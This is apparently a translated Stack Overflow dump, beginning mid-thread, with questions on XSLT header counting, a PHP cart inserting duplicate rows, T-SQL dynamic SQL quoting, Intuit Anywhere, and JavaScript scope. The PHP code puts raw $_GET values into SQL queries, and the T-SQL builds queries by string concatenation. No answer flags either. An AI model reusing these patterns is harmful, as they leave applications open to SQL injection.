                  <xsl:for-each select="../../../../../../imp1:Details/imp1:ShipmentDetail">
                    <xsl:variable name="ErpOrderDetailLevel"
                                  select="imp1:ErpOrder"/>
                    <xsl:variable name="ErpOrderLineNumDetailLevel"
                                  select="imp1:ErpOrderLineNum"/>
                    <xsl:variable name="ItemSKU" select="imp1:SKU/imp1:Item"/>
                    <xsl:if test="($ErpOrderDetailLevel = $ErpOrderContLevel) and ($ErpOrderLineNumDetailLevel = $ErpOrderLineNumContLevel)">
                      <ns1:PartnerItemNum>
                        <xsl:value-of select="$ItemSKU"/>
                      </ns1:PartnerItemNum>
                    </xsl:if>
                  </xsl:for-each>
                  <xsl:choose>
                    <xsl:when test="imp1:Quantity">
                      <ns1:QuantityShipped>
                        <xsl:value-of select="number(imp1:Quantity)"/>
                      </ns1:QuantityShipped>
                    </xsl:when>
                    <xsl:otherwise>
                      <ns1:QuantityShipped>
                        <xsl:value-of select="imp1:Quantity"/>
                      </ns1:QuantityShipped>
                    </xsl:otherwise>
                  </xsl:choose>
                  <ns1:ItemCost>
                    <xsl:text disable-output-escaping="no"></xsl:text>
                  </ns1:ItemCost>
                  <ns1:ShippingComments>
                    <xsl:text disable-output-escaping="no"></xsl:text>
                  </ns1:ShippingComments>
                  <ns1:TrailerNumber>
                    <xsl:text disable-output-escaping="no"></xsl:text>
                  </ns1:TrailerNumber>
                  <xsl:choose>
                    <xsl:when test="string-length($Position) > 1.0">
                      <ns1:CartonId>
                        <xsl:value-of select="concat(substring($ContainerId,3.0),$Position)"/>
                      </ns1:CartonId>
                    </xsl:when>
                    <xsl:otherwise>
                      <ns1:CartonId>
                        <xsl:value-of select='concat(substring($ContainerId,3.0),concat("0",position()))'/>
                      </ns1:CartonId>
                    </xsl:otherwise>
                  </xsl:choose>
                  <ns1:ASNNumber>
                    <xsl:value-of select="../../../../../../imp1:BolNumAlpha"/>
                  </ns1:ASNNumber>
                  <ns1:CreateDateTime>
                    <xsl:value-of select='xp20:format-dateTime(xp20:current-dateTime(),"[Y0001]-[M01]-[D01]-[H01].[m01].[s01]")'/>
                  </ns1:CreateDateTime>
                  <ns1:Warehouse>
                    <xsl:text disable-output-escaping="no">235</xsl:text>
                  </ns1:Warehouse>
                </ns1:Header>
              </xsl:for-each>
            </xsl:for-each>
          </xsl:for-each>
        </xsl:if>
      </xsl:for-each>
      <ns1:Trailer>
        <ns1:RecordId>
          <xsl:text disable-output-escaping="no">TRAILER</xsl:text>
        </ns1:RecordId>
        <ns1:TotalRec>
          <xsl:value-of select="$RecordCount + 1.0"/>
        </ns1:TotalRec>
        <ns1:BatchId>
          <xsl:value-of select="/imp1:WMWROOT/imp1:WMWDATA/imp1:WMFWUpload/imp1:Shipments/imp1:Shipment[1]/imp1:ShippingLoadNum"/>
        </ns1:BatchId>
      </ns1:Trailer>
    </ns1:ASN-Feed>
  </xsl:template>
</xsl:stylesheet> 
```

**这是 XML：-**

```
 <WMWROOT xmlns="http://www.manh.com/ILSNET/Interface">
   <WMWDATA>
      <WMFWUpload xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <Date>2013-03-18T16:42:50.0398834-04:00</Date>
         <GroupIndex>1</GroupIndex>
         <Id>e229d320-0c30-4e97-a01f-d4d1ef779303</Id>
         <NumGroups>1</NumGroups>
         <NumRecs>2</NumRecs>
         <Shipments>
            <Shipment>
               <BolNumAlpha>08264940000006126</BolNumAlpha>   
               <Carrier>
                  <Condition>Shipped</Condition>
                </Carrier>  
                  <Customer>
                     <Company>Garage</Company>
                     <Customer>30000</Customer>
                     <CustomerCategories/>
                     <ShipTo>30000</ShipTo>
                  </Customer>
                  <ErpOrder>3000013661</ErpOrder>
                  <OrderType>Refill</OrderType>
                  <Warehouse>8051</Warehouse>
                  <Details>
                     <ShipmentDetail>
                        <UserDef1>Y</UserDef1>
                        <UserDef3>30000</UserDef3>
                        <ErpOrder>3000013661</ErpOrder>
                        <ErpOrderLineNum>1.00000</ErpOrderLineNum>
                        <SKU>
                           <Item>3085142</Item>
                        </SKU>
                     </ShipmentDetail>
                     <ShipmentDetail>
                        <UserDef1>Y</UserDef1>
                        <UserDef3>30000</UserDef3>
                        <ErpOrder>3000013661</ErpOrder>
                        <ErpOrderLineNum>2.00000</ErpOrderLineNum>
                        <SKU>
                           <Item>3085142</Item>
                        </SKU>
                     </ShipmentDetail>
                     <ShipmentDetail>
                        <UserDef1>Y</UserDef1>
                        <UserDef3>30000</UserDef3>
                        <ErpOrder>3000013661</ErpOrder>
                        <ErpOrderLineNum>3.00000</ErpOrderLineNum>
                        <SKU>
                           <Item>3085142</Item>
                        </SKU>
                     </ShipmentDetail>
                     <ShipmentDetail>
                        <UserDef1>Y</UserDef1>
                        <UserDef3>30000</UserDef3>
                        <ErpOrder>3000013661</ErpOrder>
                        <ErpOrderLineNum>4.00000</ErpOrderLineNum>
                        <SKU>
                           <Item>3085142</Item>
                        </SKU>
                     </ShipmentDetail>
                     <ShipmentDetail>
                        <UserDef1>Y</UserDef1>
                        <UserDef3>30000</UserDef3>
                        <ErpOrder>3000013661</ErpOrder>
                        <ErpOrderLineNum>5.00000</ErpOrderLineNum>
                        <SKU>
                           <Item>3085142</Item>
                        </SKU>
                     </ShipmentDetail>
                     <ShipmentDetail>
                        <UserDef1>Y</UserDef1>
                        <UserDef3>30000</UserDef3>
                        <ErpOrder>3000013661</ErpOrder>
                        <ErpOrderLineNum>6.00000</ErpOrderLineNum>
                        <SKU>
                           <Item>3085142</Item>
                        </SKU>
                     </ShipmentDetail>
                     <ShipmentDetail>
                        <UserDef1>Y</UserDef1>
                        <UserDef3>30000</UserDef3>
                        <ErpOrder>3000013661</ErpOrder>
                        <ErpOrderLineNum>7.00000</ErpOrderLineNum>
                        <SKU>
                           <Item>3085142</Item>
                        </SKU>
                     </ShipmentDetail>
                     <ShipmentDetail>
                        <UserDef1>Y</UserDef1>
                        <UserDef3>30000</UserDef3>
                        <ErpOrder>3000013661</ErpOrder>
                        <ErpOrderLineNum>8.00000</ErpOrderLineNum>
                        <SKU>
                           <Item>3085142</Item>
                        </SKU>
                     </ShipmentDetail>
                     <ShipmentDetail>
                     <UserDef1>Y</UserDef1>
                     <UserDef3>30000</UserDef3>
                     <ErpOrder>3000013661</ErpOrder>
                     <ErpOrderLineNum>9.00000</ErpOrderLineNum>
                     <SKU>
                        <Item>3085142</Item>
                     </SKU>
                     </ShipmentDetail>
                  </Details>
                  <Containers>
                     <ShippingContainer>
                        <ContainerID>0000000000000000000</ContainerID>
                        <ContainerType>
                           <Type>PALLET</Type>
                        </ContainerType>
                        <NestedContainers>
                           <ShippingContainer>
                              <ContainerId>00008264940000019935</ContainerId>
                              <ContainerDetails>
                                 <ContainerDetail>
                                    <BundleId>0</BundleId>
                                    <ErpOrder>3000013661</ErpOrder>
                                    <ErpOrderLineNum>1.00000</ErpOrderLineNum>
                                    <Quantity>1.00000</Quantity>
                                    <QuantityUm>Each</QuantityUm>
                                 </ContainerDetail>
                                 <ContainerDetail>
                                    <BundleId>0</BundleId>
                                    <ErpOrder>3000013661</ErpOrder>
                                    <ErpOrderLineNum>1.00000</ErpOrderLineNum>
                                    <Quantity>2.00000</Quantity>
                                    <QuantityUm>Each</QuantityUm>
                                 </ContainerDetail>
                                 <ContainerDetail>
                                    <BundleId>0</BundleId>
                                    <ErpOrder>3000013661</ErpOrder>
                                    <ErpOrderLineNum>1.00000</ErpOrderLineNum>
                                    <Quantity>3.00000</Quantity>
                                    <QuantityUm>Each</QuantityUm>
                                 </ContainerDetail>
                                 <ContainerDetail>
                                    <BundleId>0</BundleId>
                                    <ErpOrder>3000013661</ErpOrder>
                                    <ErpOrderLineNum>1.00000</ErpOrderLineNum>
                                    <Quantity>4.00000</Quantity>
                                    <QuantityUm>Each</QuantityUm>
                                 </ContainerDetail>
                                 <ContainerDetail>
                                    <BundleId>0</BundleId>
                                    <ErpOrder>3000013661</ErpOrder>
                                    <ErpOrderLineNum>1.00000</ErpOrderLineNum>
                                    <Quantity>5.00000</Quantity>
                                    <QuantityUm>Each</QuantityUm>
                                 </ContainerDetail>
                                 <ContainerDetail>
                                    <BundleId>0</BundleId>
                                    <ErpOrder>3000013661</ErpOrder>
                                    <ErpOrderLineNum>6.00000</ErpOrderLineNum>
                                    <Quantity>6.00000</Quantity>
                                    <QuantityUm>Each</QuantityUm>
                                 </ContainerDetail>
                                 <ContainerDetail>
                                    <BundleId>0</BundleId>
                                    <ErpOrder>3000013661</ErpOrder>
                                    <ErpOrderLineNum>7.00000</ErpOrderLineNum>
                                    <Quantity>6.00000</Quantity>
                                    <QuantityUm>Each</QuantityUm>
                                 </ContainerDetail>
                                 <ContainerDetail>
                                    <BundleId>0</BundleId>
                                    <ErpOrder>3000013661</ErpOrder>
                                    <ErpOrderLineNum>8.00000</ErpOrderLineNum>
                                    <Quantity>6.00000</Quantity>
                                    <QuantityUm>Each</QuantityUm>
                                 </ContainerDetail>
                                 <ContainerDetail>
                                    <BundleId>0</BundleId>
                                    <ErpOrder>3000013661</ErpOrder>
                                    <ErpOrderLineNum>9.00000</ErpOrderLineNum>
                                    <Quantity>6.00000</Quantity>
                                    <QuantityUm>Each</QuantityUm>
                                 </ContainerDetail>
                              </ContainerDetails>
                              <ContainerType>
                                 <ProcessStamp>fe4e12f2-ac06-4786-b1ff-509c82792d45</ProcessStamp>
                                 <UserStamp>sboisvert</UserStamp>
                                 <Class>Carton(s)</Class>
                                 <Desc>Carton</Desc>
                                 <DimensionUm>IN</DimensionUm>
                                 <Height>20.00000</Height>
                                 <Length>20.00000</Length>
                                 <MaxWeight>70.00000</MaxWeight>
                                 <Type>Carton</Type>
                                 <UseAsDefault>Y</UseAsDefault>
                                 <Volume>8000.00000</Volume>
                                 <Weight>0.50000</Weight>
                                 <WeightUm>LB</WeightUm>
                                 <WeightTolerance>1.00000</WeightTolerance>
                                 <Width>20.00000</Width>
                              </ContainerType>
                              <GroupNum>0</GroupNum>
                              <GroupPosition>0</GroupPosition>
                              <InternalContainerNum>1008185</InternalContainerNum>
                              <InternalShipmentNum>1009736</InternalShipmentNum>
                              <ManifestId/>
                              <ManifestState/>
                              <Msn>0</Msn>
                              <Status>900</Status>
                              <StatusFailed>N</StatusFailed>
                              <TotalAccCharge>0.00000</TotalAccCharge>
                              <TotalFreightCharge>0.00000</TotalFreightCharge>
                              <TotalFreightDiscount>0.00000</TotalFreightDiscount>
                              <TotalQuantity>71.00000</TotalQuantity>
                              <TotalValue>0.00000</TotalValue>
                              <TotalWeight>36.10000</TotalWeight>
                              <TreeUnit>1008185</TreeUnit>
                              <WeightUm>KG</WeightUm>
                           </ShippingContainer>
                        </NestedContainers>
                     </ShippingContainer>
                  </Containers>
            </Shipment>
            </Shipments>
      </WMFWUpload>
   </WMWDATA>
</WMWROOT> 
```

我喜欢获取 Header 的计数（可以在 xslt 中看到）并且必须分配给 TotalRec。

我想使用相同的 xslt 获得计数，因为我使用另一个 xslt 然后我的整个设计必须改变。

所以有人可以给我解决方案或逻辑。

**样本输出** <

```
ns1:ASN-Feed><ns1:Header><ns1:StoreNum>763</ns1:StoreNum>
<ns1:ReceivingType>A</ns1:ReceivingType><ns1:PartnerShipmentNum/><ns1:OrderDate/>      <ns1:ShipmentReceiptDate>13-03-21</ns1:ShipmentReceiptDate><ns1:ShipperName>001 GARAGE MONTREAL</ns1:ShipperName><ns1:PartnerItemNum>3088853</ns1:PartnerItemNum>      <ns1:QuantityShipped>1</ns1:QuantityShipped><ns1:ItemCost/><ns1:ShippingComments/>
<ns1:TrailerNumber/><ns1:CartonId>00826494000001913301</ns1:CartonId>      <ns1:ASNNumber>08264940000006140</ns1:ASNNumber>     <ns1:CreateDateTime>2013-03-21-09.50.38</ns1:CreateDateTime><ns1:Warehouse>235</ns1:Warehouse>
</ns1:Header><ns1:Trailer><ns1:RecordId>TRAILER</ns1:RecordId><ns1:TotalRec>1</ns1:TotalRec>
<ns1:BatchId>1002012</ns1:BatchId></ns1:Trailer></ns1:ASN-Feed> 
```

请注意，此示例与提供的 XML 无关

问候。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:47:44.360

目前，该 XSLT 从该输入中生成 0 个 Header 元素，主要是因为`imp1:Carrier`XPath 中缺少一个元素并且任何地方都没有`imp1:WareHouse`元素，但是一旦这些被纠正，XSLT 可以被简化，直到弄清楚最终的 Header 计数要容易得多：

```
<xsl:stylesheet version="1.0"
   xmlns:xp20="http://www.oracle.com/XSL/Transform/java/oracle.tip.pc.services.functions.Xpath20"
   xmlns:bpws="http://schemas.xmlsoap.org/ws/2003/03/business-process/"
   xmlns:ns1="http://TargetNamespace.com/WriteGSIASNFile"
   xmlns:bpel="http://docs.oasis-open.org/wsbpel/2.0/process/executable"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xmlns:tns="http://xmlns.oracle.com/pcbpel/adapter/file/WMStoATG/WMSShipmentConfirmation/ReadWMSShipmentConfirmationFile"
   xmlns:pc="http://xmlns.oracle.com/pcbpel/"
   xmlns:imp1="http://www.manh.com/ILSNET/Interface"
   xmlns:bpm="http://xmlns.oracle.com/bpmn20/extensions"
   xmlns:plt="http://schemas.xmlsoap.org/ws/2003/05/partner-link/"
   xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
   xmlns:ora="http://schemas.oracle.com/xpath/extension"
   xmlns:socket="http://www.oracle.com/XSL/Transform/java/oracle.tip.adapter.socket.ProtocolTranslator"
   xmlns:mhdr="http://www.oracle.com/XSL/Transform/java/oracle.tip.mediator.service.common.functions.MediatorExtnFunction"
   xmlns:oraext="http://www.oracle.com/XSL/Transform/java/oracle.tip.pc.services.functions.ExtFunc"
   xmlns:dvm="http://www.oracle.com/XSL/Transform/java/oracle.tip.dvm.LookupValue"
   xmlns:ns0="http://xmlns.oracle.com/pcbpel/adapter/file/WMStoRMS/WMSShipmentConfirmation/WriteGSIASNFile"
   xmlns:hwf="http://xmlns.oracle.com/bpel/workflow/xpath"
   xmlns:jca="http://xmlns.oracle.com/pcbpel/wsdl/jca/"
   xmlns:med="http://schemas.oracle.com/mediator/xpath"
   xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
   xmlns:ids="http://xmlns.oracle.com/bpel/services/IdentityService/xpath"
   xmlns:xdk="http://schemas.oracle.com/bpel/extension/xpath/function/xdk"
   xmlns:xref="http://www.oracle.com/XSL/Transform/java/oracle.tip.xref.xpath.XRefXPathFunctions"
   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
   xmlns:ldap="http://schemas.oracle.com/xpath/extension/ldap"
   exclude-result-prefixes="xsi xsl tns pc imp1 plt wsdl jca xsd ns1 ns0 xp20 
                                         bpws bpel bpm ora socket mhdr oraext dvm hwf med 
                                         ids xdk xref ldap">
  <xsl:output indent="yes" omit-xml-declaration="yes" />

  <xsl:template match="/">
    <xsl:variable
       name="AllShipments"
       select="/imp1:WMWROOT/imp1:WMWDATA/imp1:WMFWUpload/imp1:Shipments
               /imp1:Shipment"/>
    <xsl:variable
       name="ShipmentsFilterType"
       select="$AllShipments[imp1:OrderType = 'Refill' or
                             imp1:OrderType = 'Store Order']" />
    <xsl:variable
       name="ShipmentsFilterWarehouse"
       select="$ShipmentsFilterType[imp1:WareHouse = '8001']" />
    <xsl:variable
       name="ShipmentsFilterUser"
       select="$ShipmentsFilterWarehouse[imp1:Details/imp1:ShipmentDetail[1]
                                                    /imp1:UserDef3 != '']" />
    <xsl:variable
       name="RecordCount"
       select="count($ShipmentsFilterUser
                         /imp1:Containers/imp1:ShippingContainer
                         /imp1:NestedContainers/imp1:ShippingContainer
                         /imp1:ContainerDetails/imp1:ContainerDetail)"/>
    <ns1:ASN-Feed>
      <xsl:apply-templates select="$ShipmentsFilterUser" />
      <ns1:Trailer>
        <ns1:RecordId>
          <xsl:text disable-output-escaping="no">TRAILER</xsl:text>
        </ns1:RecordId>
        <ns1:TotalRec>
          <xsl:value-of select="$RecordCount + 1.0"/>
        </ns1:TotalRec>
        <ns1:BatchId>
          <xsl:value-of
             select="/imp1:WMWROOT/imp1:WMWDATA/imp1:WMFWUpload
                     /imp1:Shipments/imp1:Shipment[1]/imp1:ShippingLoadNum"/>
        </ns1:BatchId>
      </ns1:Trailer>
    </ns1:ASN-Feed>
  </xsl:template>

  <xsl:template match="imp1:Shipment">
    <xsl:apply-templates select="imp1:Containers/imp1:ShippingContainer" />
  </xsl:template>

  <xsl:template match="imp1:Containers/imp1:ShippingContainer">
    <xsl:apply-templates select="imp1:NestedContainers/imp1:ShippingContainer" />
  </xsl:template>

  <xsl:template match="imp1:NestedContainers/imp1:ShippingContainer">
    <xsl:apply-templates select="imp1:ContainerDetails/imp1:ContainerDetail">
      <xsl:with-param name="ContainerId" select="imp1:ContainerId" />
    </xsl:apply-templates>
  </xsl:template>

  <xsl:template match="imp1:ContainerDetails/imp1:ContainerDetail">
    <xsl:param name="ContainerId" />
    <xsl:variable name="ErpOrderContLevel" select="imp1:ErpOrder"/>
    <xsl:variable name="ErpOrderLineNumContLevel"
                  select="imp1:ErpOrderLineNum"/>
    <xsl:variable name="Position" select="position()"/>
    <ns1:Header>
      <ns1:StoreNum>
        <xsl:text disable-output-escaping="no">763</xsl:text>
      </ns1:StoreNum>
      <ns1:ReceivingType>
        <xsl:text disable-output-escaping="no">A</xsl:text>
      </ns1:ReceivingType>
      <ns1:PartnerShipmentNum>
        <xsl:text disable-output-escaping="no"></xsl:text>
      </ns1:PartnerShipmentNum>
      <ns1:OrderDate>
        <xsl:text disable-output-escaping="no"></xsl:text>
      </ns1:OrderDate>
      <ns1:ShipmentReceiptDate>
        <xsl:value-of select='xp20:format-dateTime(xp20:current-date(),
                                                   "[Y01]-[M01]-[D01]")'/>
      </ns1:ShipmentReceiptDate>
      <ns1:ShipperName>
        <xsl:text disable-output-escaping="no">001 GARAGE MONTREAL</xsl:text>
      </ns1:ShipperName>
      <xsl:for-each
         select="ancestor::imp1:Carrier/imp1:Details/imp1:ShipmentDetail">
        <xsl:variable name="ErpOrderDetailLevel"
                      select="imp1:ErpOrder"/>
        <xsl:variable name="ErpOrderLineNumDetailLevel"
                      select="imp1:ErpOrderLineNum"/>
        <xsl:variable name="ItemSKU" select="imp1:SKU/imp1:Item"/>
        <xsl:if
             test="($ErpOrderDetailLevel = $ErpOrderContLevel) and 
                   ($ErpOrderLineNumDetailLevel = $ErpOrderLineNumContLevel)">
          <ns1:PartnerItemNum>
            <xsl:value-of select="$ItemSKU"/>
          </ns1:PartnerItemNum>
        </xsl:if>
      </xsl:for-each>
      <xsl:choose>
        <xsl:when test="imp1:Quantity">
          <ns1:QuantityShipped>
            <xsl:value-of select="number(imp1:Quantity)"/>
          </ns1:QuantityShipped>
        </xsl:when>
        <xsl:otherwise>
          <ns1:QuantityShipped>
            <xsl:value-of select="imp1:Quantity"/>
          </ns1:QuantityShipped>
        </xsl:otherwise>
      </xsl:choose>
      <ns1:ItemCost>
        <xsl:text disable-output-escaping="no"></xsl:text>
      </ns1:ItemCost>
      <ns1:ShippingComments>
        <xsl:text disable-output-escaping="no"></xsl:text>
      </ns1:ShippingComments>
      <ns1:TrailerNumber>
        <xsl:text disable-output-escaping="no"></xsl:text>
      </ns1:TrailerNumber>
      <xsl:choose>
        <xsl:when test="string-length($Position) > 1.0">
          <ns1:CartonId>
            <xsl:value-of select="concat(substring($ContainerId,3.0),$Position)"/>
          </ns1:CartonId>
        </xsl:when>
        <xsl:otherwise>
          <ns1:CartonId>
            <xsl:value-of select='concat(substring($ContainerId,3.0), 
                                         "0", position())'/>
          </ns1:CartonId>
        </xsl:otherwise>
      </xsl:choose>
      <ns1:ASNNumber>
        <xsl:value-of select="ancestor::imp1:Shipment/imp1:BolNumAlpha"/>
      </ns1:ASNNumber>
      <ns1:CreateDateTime>
        <xsl:value-of select='xp20:format-dateTime(xp20:current-dateTime(),
                                    "[Y0001]-[M01]-[D01]-[H01].[m01].[s01]")'/>
      </ns1:CreateDateTime>
      <ns1:Warehouse>
        <xsl:text disable-output-escaping="no">235</xsl:text>
      </ns1:Warehouse>
    </ns1:Header>
  </xsl:template>
</xsl:stylesheet> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T23:52:53.613

尝试将您的逻辑嵌套到 xsl:variable 并计算变量

包括下面的示例模板

```
<xsl:variable name="headerDoc" as="node()*">
  your for loops ...
 <ns1:Header>
   <ns1:StoreNum> ... your logic goes here </ns1:StoreNum>
 </ns1:Header> 
</xsl:variable> 
```

`<xsl:variable name="TotalRec" select="count($headerDoc/*:Header)"/>`应该给出 Header 的计数

# php - 每次刷新页面时，PHP Mysql 新行都插入到数据库表中

> ID：15533181
> 
> 赞同：1
> 
> 时间：2013-03-20T19:42:41.230
> 
> 标签：php, mysql

我正在创建一个带有购物车的网站，我成功地将商品添加到购物篮中，但我希望将商品中的购物篮同时插入到我的数据库中的订单表中，这有效，但每次我刷新页面或四处移动时不同的页面 不断插入当前在 basked 中的相同项目。

我允许用户从购物篮中删除项目，但我希望同样的事情发生在我的数据库表中。

这是我的代码，请分析并指出解决方案 THX。

购物车.php：

```
if (isset($_GET['add'])){
    $quantity = mysql_query('SELECT product_id, product_qua FROM products WHERE product_id='.$_GET['add']);
    while($quantity_row = mysql_fetch_assoc($quantity)){
        if($quantity_row['product_qua'] !=$_SESSION['cart_'.$_GET['add']]){
            $_SESSION['cart_'.$_GET['add']]+='1'; 
        }
    }
}

if (isset($_GET['add'])){
    $qq = mysql_query('SELECT * FROM users');
    while($user_rows = mysql_fetch_assoc($qq)){
        $grr = $_SESSION['username'];
        if($user_rows['username'] == $grr){
        $z = $user_rows['first_name'];
        $zz = $user_rows['last_name'];
            }
        }
    $q = mysql_query('SELECT product_name, product_qua, product_price from products WHERE product_id='.$_GET['add']);
    while($prod_rows = mysql_fetch_assoc($q)){

        $x = $prod_rows['product_name'];
        $xx = $prod_rows['product_price'];
        $xxx = $prod_rows['product_qua'];

        $order = "INSERT INTO orders (order_user_first_name, order_user_last_name, order_product_name, order_product_price, order_product_quantity ) VALUES ('$z','$zz','$x','$xx','$xxx')";
        mysql_query($order);
    }

}

if(isset($_GET['remove'])){
    $_SESSION['cart_'.$_GET['remove']]--;
} 
```

上面的代码不是文件中的所有代码，而是负责我要实现的部分

问候

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:44:20.700

听起来您在 URL 中传递变量，当您浏览站点时，这些变量将继续传递。也许您应该在添加项目后执行重定向，这样它就不会维护变量？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T19:45:34.277

事情就是这样，您的代码完全按照您的要求执行。您正在使用**$_GET**，而是将数据发布到数据库中。

我使用**$_GET**的方式是当我需要从服务器中选择数据或检索数据时。当我需要将数据发布到服务器时，我使用**$_POST 。**

解决您的问题的方法是创建一个将数据发布到其中的脚本，然后进行重定向以避免重新插入表中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T19:44:37.470

你应该尝试 $_POST 而不是 $_GET 吗？

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2017-04-08T22:00:35.853

改用. `$_GET`_`$_POST`

解决您的问题的方法是创建一个将数据发布到其中的脚本，然后进行重定向以避免重新插入表中。

# sql-server - “为变量赋值的 SELECT 语句不得与数据检索操作结合使用。” 关于 SP 中的变量

> ID：15533185
> 
> 赞同：0
> 
> 时间：2013-03-20T19:42:53.587
> 
> 标签：sql-server, stored-procedures, dynamic-sql

我的查询比我在这里发布的要复杂得多，但是在使用 SQL 时我无法使用变量`sp_execute`……有解决方法吗？

```
declare @system_status varchar(30)
select @system_status = '12,20'

declare @sql nvarchar(4000)

select @sql = 'SELECT [system_status] 
FROM VW_Document_Main 
WHERE 1=1 ' 

IF @system_status IS NOT NULL AND @system_status NOT IN ('-1','0') 
BEGIN 
SELECT @sql = @sql + 'and (',''+@system_Status+'',') LIKE ''%,''+system_Status+'',%''' 
```

我正在尝试将一个字符串连接到 SQL 的末尾，并最终使用`sp_executesql`

但是，我收到一条关于我的连接的错误消息：

> *为变量赋值的 SELECT 语句不得与数据检索操作结合使用。*

关于如何修复它/解决方法的任何想法？

....这很尴尬，用 SET 代替 SELECT 效果很好...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:01:09.770

您的 SELECT 中的逗号有问题。我不完全确定您要做什么，所以这里有两种可能的方法，我已经让它工作了。

1) 去掉逗号。

```
SELECT @sql = @sql + 'and ('''+@system_Status+''') LIKE ''%,''+system_Status+'',%''' 
```

这使查询看起来像这样。

```
SELECT [system_status] 
FROM VW_Document_Main 
WHERE 1=1 and ('12,20') LIKE '%,'+system_Status+',%' 
```

2）添加更多引号，以便逗号不在字符串之外。

```
SELECT @sql = @sql + 'and ('',''+@system_Status+'','') LIKE ''%,''+system_Status+'',%''' 
```

这使得输出像这样。

```
SELECT [system_status] 
FROM VW_Document_Main 
WHERE 1=1 and (','+@system_Status+',') LIKE '%,'+system_Status+',%' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T19:57:32.033

您的动态 sql 构造有错误。我认为你在最后一行需要的是这样的：

```
 SELECT @sql = @sql + 
              'and ('+','+@system_Status+',) LIKE ''%,'+
              @system_Status+',%''' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T19:58:26.050

您缺少一些引号：

```
declare @system_status varchar(30)
select @system_status = '12,20'

declare @sql nvarchar(4000)

select @sql = 'SELECT [system_status] 
FROM VW_Document_Main 
WHERE 1=1 ' 

IF @system_status IS NOT NULL AND @system_status NOT IN ('-1','0') 
BEGIN 
SELECT @sql = @sql + 'and ('','+@system_Status+','') LIKE ''%,''+system_Status+'',%'''
END
SELECT @sql 
```

# intuit-partner-platform - 选择 Intuit 开发框架

> ID：15533188
> 
> 赞同：0
> 
> 时间：2013-03-20T19:43:00.103
> 
> 标签：intuit-partner-platform, quickbooks-online

我正在构建一个允许连接到 Quickbooks Online 的 .Net C# 应用程序。我了解，为了与 Intuit Anywhere 一起工作，应用程序必须是 SaaS。这是否意味着应用程序必须在 Intuit 的 App Center 中可用？我想构建一个应用程序，但现在我没有计划在 Intuit App Center 中提供它。如果这是真的，我开发使用 Quickbooks SDK 的唯一选择是什么？如果是，是否有可用的文档和示例 .Net 代码讨论使用 SDK 和 Quickbooks Online 进行身份验证/连接。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T12:33:54.777

由于 Intuit Anywhere 模型的性质，它必须是 Saas 应用程序，但它不必在 Intuit Appcenter 上可用。听起来它适用于您当前服务的现有客户。在这种情况下，它很好，它只被称为“连接到 QuickBooks”。

遵循在 Intuit Anywhere 上发布的指南，唯一的区别是没有营销审查或将应用程序发布到应用程序中心。

谢谢贾里德
_

# javascript - 无法访问函数外的变量

> ID：15533191
> 
> 赞同：0
> 
> 时间：2013-03-20T19:43:04.523
> 
> 标签：javascript, global-variables, closures

我有以下JS：

```
Meteor.startup(function () {
  map = L.map('map_canvas').locate({setView: true, maxZoom: 21});
  L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {
      attribution: '&copy; <a href="http://osm.org/copyright">OpenStreetMap</a> contributors'
  }).addTo(map);
    bounds = {};    
    map.on('locationfound', function(e){ 
      bounds.bottomLeftLat = map.getBounds()._southWest.lat;
      bounds.bottomLeftLng = map.getBounds()._southWest.lng;
      bounds.topRightLat = map.getBounds()._northEast.lat;
      bounds.topRightLng = map.getBounds()._northEast.lng;
      console.log(bounds);
    });
  console.log('outside function: '+bounds);
}); 
```

我的第一个 console.log 在控制台中正确输出了 4 个对象属性及其值，但是外部函数日志输出一个空对象，当我尝试访问 Meteor.startup 之外的边界时，它甚至都没有定义。我知道函数限制了变量的范围，但是如果在匿名函数之外定义了边界，没有'var'，它不被认为是全局的吗？

1.  为什么我可以在 Meteor.startup 之外访问“地图”而不是“边界”？
2.  如何通过遵循更多智能模式（模块？）来重写此代码，以便我既可以在脚本的其他部分提供边界，又可以在尝试时成功添加四个属性？

**编辑**事件被触发 - 手动触发后，我仍然得到一个空对象：

```
map.fire("locationfound");
Object {type: "locationfound", target: e, bottomLeftLat: 50.05008477838258, bottomLeftLng: 0.384521484375, topRightLat: 51.63847621195153…}
 MainClient.js:12
e {options: Object, _container: div#map_canvas.leaflet-container leaflet-fade-anim, _panes: Object, _mapPane: div.leaflet-map-pane, _tilePane: div.leaflet-tile-pane…}
bounds
Object {} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T19:48:37.337

它正在查看，`bounds`但您`console.log`在事件回调之前`locationfound`发生，因此当您尝试访问它时它仍然是空的。

您的所有初始化都将在事件第一次`locationfound`触发时发生，此时的日志将显示您期望的结果。

一些想法。

1.  一般来说，不赞成声明变量`var`。如果要全局访问它，请`var`在全局上下文中声明它，或者（理想情况下）使用命名空间变量并将所有全局变量声明为它的属性。

2.  如果要在修改后访问边界，可以将调用放在回调中要运行的函数

### 更新以阐明您的代码的行为

这是您的代码的执行方式。

```
//This is the startup function for meteor.  It is passed a function, 
//and executes that function when the code starts up
Meteor.startup(function () {
    //You're now inside the function you passed to startup, and you initialize map
    //...
    bounds = {};    
    //here you call the `on` function on map, and bind a 
    //callback function to the locationfound event
    map.on('locationfound', function(e){ 
      //This code is inside the callback and will be executed when the event occurs 

      // code initializing bounds

      console.log(bounds); //this will show the full definition of bounds
      //callback ends here
    });
  //this is outside the callback but still inside startup, 
  //and occurs immediately after the call to map.on
  console.log('outside function: '+bounds); //bounds is still empty
}); //end the startup function 
```

